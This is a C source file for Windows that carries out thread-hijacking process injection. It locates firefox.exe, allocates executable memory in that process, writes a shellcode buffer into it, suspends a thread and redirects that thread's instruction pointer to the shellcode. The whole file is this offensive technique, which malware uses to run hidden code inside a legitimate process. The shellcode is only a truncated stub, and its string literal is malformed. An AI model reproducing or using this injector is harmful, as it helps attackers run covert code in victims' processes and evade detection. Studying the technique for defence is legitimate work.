#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// shellcode
unsigned char shellcode[] = "\xfc\x48\x83\xe4\xf0\xe8\";

// Find Target Process
DWORD FindTargetProcess(const wchar_t* processName) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    DWORD pid = 0;
    if (Process32First(snapshot, &entry)) {
        do {
            if (_wcsicmp(entry.szExeFile, processName) == 0) {
                pid = entry.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return pid;
}

// Function Find First Thread
DWORD FindThreadProcess(DWORD pid) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    THREADENTRY32 entry;
    entry.dwSize = sizeof(THREADENTRY32);

    DWORD threadId = 0;
    if (Thread32First(snapshot, &entry)) {
        do {
            if (entry.th32OwnerProcessID == pid) {
                threadId = entry.th32ThreadID;
                break;
            }
        } while (Thread32Next(snapshot, &entry));
    }

    CloseHandle(snapshot);
    return threadId;
}

// Main function Hijacking
void HijackThread(DWORD pid, DWORD tid) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, tid);

    if (!hProcess || !hThread) {
        printf("Error open thread or process.\n");
        return;
    }

    // Allocate Shellcode in Memory 
    LPVOID remoteShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, remoteShellcode, shellcode, sizeof(shellcode), NULL);

    // Suspend Thread
    SuspendThread(hThread);

    // Get Context Thread
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &ctx);

#ifdef _WIN64
    // Redirect the RIP  (64 bits) for shellcode
    ctx.Rip = (DWORD64)remoteShellcode;
#else
    // Redirect the EIP (32 bits) for shellcode
    ctx.Eip = (DWORD)remoteShellcode;
#endif

    // Atualizar o contexto do thread com o novo ponteiro de instrução
    SetThreadContext(hThread, &ctx);

    // Retomar o thread para executar o shellcode
    ResumeThread(hThread);

    printf("[+] Thread hijacked!\n");

    // Clear
    CloseHandle(hThread);
    CloseHandle(hProcess);
}

int main() {
    // Trget Process "firefox.exe"
    DWORD pid = FindTargetProcess(L"firefox.exe");
    if (!pid) {
        printf("Process not Found\n");
        return -1;
    }

    printf("Target process found: PID %d\n", pid);

    // Find First Thread Process
    DWORD tid = FindThreadProcess(pid);
    if (!tid) {
        printf("No Thread Find.\n");
        return -1;
    }

    printf("Thread target Found: %d\n", tid);

    // Hijacking Thread
    HijackThread(pid, tid);

    return 0;
}
